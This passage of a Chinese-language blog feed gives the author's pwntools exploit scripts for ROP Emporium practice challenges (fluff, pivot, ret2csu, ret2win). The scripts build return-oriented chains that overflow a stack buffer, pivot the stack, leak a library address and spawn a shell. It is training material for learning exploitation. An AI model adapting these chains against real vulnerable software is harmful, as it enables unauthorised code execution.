class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./fluff'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x04008c3 </span><br><span class="line">pop_r12 = 0x04008bc</span><br><span class="line"><span class="comment">#pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"></span><br><span class="line">xor_r11_r11 = 0x0400822</span><br><span class="line"><span class="comment"># xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret</span></span><br><span class="line">xor_r11_r12 = 0x040082f</span><br><span class="line"><span class="comment"># xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret</span></span><br><span class="line">xchg_r11_r10 = 0x0400840</span><br><span class="line"><span class="comment"># xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret</span></span><br><span class="line">mov_r10_r11 = 0x040084e</span><br><span class="line"><span class="comment"># mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop_r12) + p64(bss) + p64(0) + p64(0) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r11) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r12) + p64(0)</span><br><span class="line">payload += p64(xchg_r11_r10) + p64(0) </span><br><span class="line">payload += p64(pop_r12) + <span class="string">"/bin/sh\x00"</span>+ p64(0) + p64(0) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r11) + p64(0)</span><br><span class="line">payload += p64(xor_r11_r12) + p64(0) </span><br><span class="line">payload += p64(mov_r10_r11) + p64(0) + p64(0) </span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7-pivot"></a>7-pivot</h2><p>这个貌似有用到栈迁移的东西，这个程序有两个输入，第一个是写到堆里（它给出了堆的地址），第二个是写入到栈里。很明显第二次能输入的内容太少，所以payload写入堆里，然后在栈里调用。</p><p>.so里有一个后门函数，可以直接调用ret2win，cat到flag。而要leak真实地址的话要找两个文件都有的函数，貌似是只有foothold_function函数#函数需要经过一次调用之后got表里才会有真实地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pivot'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libpivot.so'</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_so = libc.symbols[<span class="string">'foothold_function'</span>]</span><br><span class="line">ret2win = libc.symbols[<span class="string">'ret2win'</span>]</span><br><span class="line"></span><br><span class="line">foothold_function_plt = 0x0400850</span><br><span class="line">foothold_function_got = 0x0602048</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offest = ret2win - foothold_function_so</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop_rax = 0x0400b00</span><br><span class="line">mov_rax_addr = 0x0400b05</span><br><span class="line">pop_rbp = 0x0400900</span><br><span class="line">pop_rdi = 0x0400b73</span><br><span class="line"></span><br><span class="line">call_rax = 0x040098e</span><br><span class="line">add_rax_rbp = 0x0400b09</span><br><span class="line"></span><br><span class="line">xchg_rax_rsp = 0x0400b02</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"The Old Gods kindly bestow upon you a place to pivot: "</span>)</span><br><span class="line">heap_addr  = int(sh.recv(14),16)</span><br><span class="line"></span><br><span class="line">payload1 = p64(foothold_function_plt) + p64(pop_rax) + p64(foothold_function_got) + p64(mov_rax_addr)</span><br><span class="line">payload1 += p64(pop_rbp) + p64(offest) + p64(add_rax_rbp) + p64(call_rax)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload2 += p64(pop_rax) + p64(heap_addr) + p64(xchg_rax_rsp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.recvuntil(<span class="string">"into libpivot.so"</span>)  <span class="comment">#foothold_function() in libpivot.so print this sentence</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8-ret2csu"></a>8-ret2csu</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2csu'</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">system = 0x04005A0</span><br><span class="line">ret2win = 0x04007B1</span><br><span class="line">init = 0x0600E18   <span class="comment">#self init/fini</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget </span></span><br><span class="line">pop5_addr = 0x040089A  <span class="comment">#pop_rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line">mov_call = 0x0400880   <span class="comment">#mov rdx_r15 rsi_r14 edi_r13d  call r12+rbp*8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop5_addr) + p64(0) + p64(1) + p64(init) + p64(0) + p64(0) + p64(0xdeadcafebabebeef)</span><br><span class="line">payload += p64(mov_call) + <span class="string">"a"</span>*56 + p64(ret2win)</span><br><span class="line">gdb.attach(sh,<span class="string">'b setvbuf'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。&lt;/p&gt;
&lt;h2 id=&quot;1-ret2win&quot;&gt;&lt;a href=&quot;#1-ret2win&quot; class=&quot;headerlink&quot; title=&quot;1-ret2win&quot;&gt;&lt;/a&gt;1-ret2win&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh = process(&lt;span class=&quot;string&quot;&gt;&#39;./ret2win&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;shell=0x0400824&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bss = 0x0601060&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload = 0x20*&lt;span class=&quot;string&quot;&gt;&quot;a&quot;&lt;/span&gt; + p64(0) + p64(shell)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
